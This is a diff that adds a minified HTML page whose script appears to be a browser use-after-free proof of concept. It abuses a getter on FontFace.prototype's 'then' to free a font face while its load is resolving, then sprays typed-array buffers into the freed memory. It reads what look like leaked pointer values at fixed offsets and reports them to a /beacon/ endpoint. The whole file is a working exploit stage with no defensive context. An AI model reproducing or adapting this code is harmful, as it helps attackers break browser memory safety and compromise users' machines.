@@ -1,0 +1,28 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function h(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function main(){
+b('G');
+var A=new FontFace('fl','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A);void A.loaded;window._=[A];
+var e=document.createElement('style');
+e.textContent="@font-face{font-family:sl;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(e);
+var f=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(f)return;f=1;
+if(e)e.remove();try{document.fonts.delete(this);}catch(x){}
+document.body.offsetHeight;b('F');
+var a=[];window._a=a;
+for(var k=0;k<16;k++)a.push(new Uint8Array(new ArrayBuffer(192)));
+b('S');
+return;},set:function(){}});
+document.fonts.load('1em fl, sl','AB').then(function(){},function(){});
+var d=0;function sc(){if(d)return;var a=window._a;if(!a)return;
+for(var i=0;i<16;i++){var v=a[i];if(v[0]){d=1;b('H'+i+',T='+h(v,88)+',W='+h(v,104));break;}}
+if(!d)return;b('A');}
+setTimeout(sc,60);setTimeout(sc,400);setTimeout(sc,1000);
+setTimeout(function(){if(!d){d=1;b('N');}},2000);
+}
+setTimeout(main,0);
+</script></head><body>p</body></html>
